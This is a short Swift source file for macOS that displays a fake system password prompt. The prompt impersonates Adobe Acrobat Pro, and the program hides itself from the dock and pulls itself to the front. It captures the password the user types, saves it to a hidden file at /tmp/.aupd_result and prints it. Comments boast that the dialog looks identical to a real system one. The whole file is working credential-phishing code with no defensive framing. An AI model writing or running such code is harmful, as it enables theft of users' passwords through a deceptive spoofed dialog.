import Cocoa
import Security

// Minimal Swift app that displays a macOS-native auth prompt
// and captures the password. Looks identical to a real system dialog.

class AppDelegate: NSObject, NSApplicationDelegate {
    func applicationDidFinishLaunching(_ notification: Notification) {
        // Hide from dock
        NSApp.setActivationPolicy(.accessory)
        
        // Build the alert
        let alert = NSAlert()
        alert.messageText = "Adobe Acrobat Pro wants to make changes."
        alert.informativeText = "Enter your password to allow this."
        alert.alertStyle = .warning
        alert.icon = NSImage(named: NSImage.cautionName)
        
        // Add password field
        let input = NSSecureTextField(frame: NSRect(x: 0, y: 0, width: 260, height: 24))
        input.placeholderString = "Password"
        alert.accessoryView = input
        
        alert.addButton(withTitle: "OK")
        alert.addButton(withTitle: "Cancel")
        
        // Bring to front
        NSApp.activate(ignoringOtherApps: true)
        
        let response = alert.runModal()
        if response == .alertFirstButtonReturn {
            let pw = input.stringValue
            // Write to temp file for retrieval
            let path = "/tmp/.aupd_result"
            try? pw.write(toFile: path, atomically: true, encoding: .utf8)
            // Also print to stdout
            print("CAPTURED:\(pw)")
        } else {
            print("CANCELLED")
        }
        
        NSApp.terminate(nil)
    }
}

let app = NSApplication.shared
let delegate = AppDelegate()
app.delegate = delegate
app.run()
